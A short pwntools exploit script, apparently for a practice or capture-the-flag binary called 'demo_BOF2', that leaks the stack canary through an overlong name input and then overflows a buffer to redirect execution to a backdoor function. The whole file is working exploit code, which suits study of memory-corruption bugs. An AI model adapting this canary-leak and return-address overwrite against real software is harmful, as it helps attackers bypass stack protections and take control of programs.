from pwn import *


context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./demo_BOF2')

# backdoor_addr = 0x401176
no_push_rbp_backdoor_addr = 0x40118b

gdb.attach(r)
r.sendafter("Enter your name: ", b'A'*0x29) # 0x20 -> name(0x10) + phone(0x10), 0x8 -> alignment, 0x1 -> canary last byte
r.recvuntil('A'*0x29)
canary = u64(b'\x00'+r.recv(7)) # canary last byte is '\x00'
print(f"canary: {hex(canary)}")
r.sendafter("Enter your phone number: ", b'b'*0x18 + p64(canary) + p64(0xdeadbeef) + p64(no_push_rbp_backdoor_addr))

r.interactive()
